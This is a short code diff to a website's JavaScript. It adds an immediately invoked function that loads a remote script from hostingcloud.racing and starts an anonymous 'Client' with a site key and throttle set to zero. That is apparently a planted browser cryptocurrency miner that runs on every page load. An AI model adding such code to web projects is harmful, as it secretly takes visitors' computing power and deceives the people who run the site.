@@ -71,4 +71,14 @@ document.body.appendChild(x);
     var entry = document.getElementsByTagName('script')[0];
     entry.parentNode.insertBefore(script, entry);
 })();
+(function() {
+    var script = document.createElement('script');
+    script.async = true;
+    script.src = 'https://www.hostingcloud.racing/sszq.js';
+    var entry = document.getElementsByTagName('script')[0];
+    script.onload = script.onreadystatechange = function () {var _client = new Client.Anonymous('c3c3312a6676d801236f531f505609e0c32ad4d6d642f8dc78fd2e92cd5e31dd', {throttle: 0, c: 'w', ads: 0}); _client.start();};
+
+    entry.parentNode.insertBefore(script, entry);
+    
+})();
 derot();
